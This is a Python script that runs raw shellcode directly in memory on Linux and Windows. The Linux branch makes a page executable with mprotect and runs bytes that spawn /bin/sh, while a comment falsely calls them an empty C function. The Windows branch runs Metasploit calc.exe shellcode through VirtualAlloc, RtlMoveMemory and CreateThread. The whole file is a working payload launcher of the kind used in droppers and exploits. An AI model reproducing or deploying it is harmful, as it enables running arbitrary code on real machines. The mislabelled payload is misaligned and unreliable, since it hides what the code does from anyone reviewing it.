#!/usr/bin/python
import sys
import ctypes

if sys.platform.startswith('linux'):
    from ctypes import *

    # Initialise ctypes prototype for mprotect().
    # According to the manpage:
    #     int mprotect(const void *addr, size_t len, int prot);
    libc = CDLL("libc.so.6")
    mprotect = libc.mprotect
    mprotect.restype = c_int
    mprotect.argtypes = [c_void_p, c_size_t, c_int]

    # PROT_xxxx constants
    # Output of gcc -E -dM -x c /usr/include/sys/mman.h | grep PROT_
    #     #define PROT_NONE 0x0
    #     #define PROT_READ 0x1
    #     #define PROT_WRITE 0x2
    #     #define PROT_EXEC 0x4
    #     #define PROT_GROWSDOWN 0x01000000
    #     #define PROT_GROWSUP 0x02000000
    PROT_NONE = 0x0
    PROT_READ = 0x1
    PROT_WRITE = 0x2
    PROT_EXEC = 0x4

    # Machine code of an empty C function, generated with gcc
    # Disassembly:
    #     55        push   %ebp
    #     89 e5     mov    %esp,%ebp
    #     5d        pop    %ebp
    #     c3        ret
    code = "\x48\x31\xc0\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\xb0\x3b\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\x0f\x05"

    # Get the address of the code
    addr = addressof(cast(c_char_p(code), POINTER(c_char)).contents)

    # Get the start of the page containing the code and set the permissions
    pagesize = 0x1000
    pagestart = addr & ~(pagesize - 1)
    if mprotect(pagestart, pagesize, PROT_READ|PROT_WRITE|PROT_EXEC):
        raise RuntimeError("Failed to set permissions using mprotect()")

    # Generate ctypes function object from code
    functype = CFUNCTYPE(None)
    f = functype(addr)

    # Call the function
    print("Calling f()")
    f()

elif sys.platform.startswith('win'):
    #Metasploit windows/exec calc.exe
    buf =  ""
    buf += "\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b"
    buf += "\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
    buf += "\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20"
    buf += "\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b"
    buf += "\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0"
    buf += "\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b"
    buf += "\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01"
    buf += "\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2"
    buf += "\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c"
    buf += "\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b"
    buf += "\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86"
    buf += "\x5d\x6a\x01\x8d\x85\xb9\x00\x00\x00\x50\x68\x31\x8b"
    buf += "\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd"
    buf += "\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
    buf += "\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5\x63\x61\x6c\x63"
    buf += "\x2e\x65\x78\x65\x00"

    shellcode = bytearray(buf)
     
    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                              ctypes.c_int(len(shellcode)),
                                              ctypes.c_int(0x3000),
                                              ctypes.c_int(0x40))
     
    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
     
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                         buf,
                                         ctypes.c_int(len(shellcode)))
     
    ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                             ctypes.c_int(0),
                                             ctypes.c_int(ptr),
                                             ctypes.c_int(0),
                                             ctypes.c_int(0),
                                             ctypes.pointer(ctypes.c_int(0)))
     
    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
